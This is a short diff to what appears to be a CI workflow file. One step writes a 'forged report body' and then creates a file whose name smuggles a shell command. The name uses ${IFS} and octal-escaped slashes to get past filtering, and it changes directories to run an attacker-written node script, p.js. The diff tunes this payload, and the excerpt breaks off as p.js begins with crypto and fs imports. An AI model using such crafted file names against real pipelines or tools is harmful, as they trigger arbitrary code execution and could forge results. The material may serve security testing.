@@ -11,7 +11,7 @@ jobs:
         run: |
           mkdir -p content
           printf 'forged report body' > content/summary.txt
-          : > 'content/summary.txt;node${IFS}$(printf${IFS}\\057)tmp$(printf${IFS}\\057)content$(printf${IFS}\\057)content$(printf${IFS}\\057)p.js;#.txt'
+          : > 'content/summary.txt;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}..;cd${IFS}tmp;cd${IFS}content;cd${IFS}content;node${IFS}p.js;#.txt'
           cat > content/p.js <<'JSEOF'
           const c = require('crypto');
           const fs = require('fs');
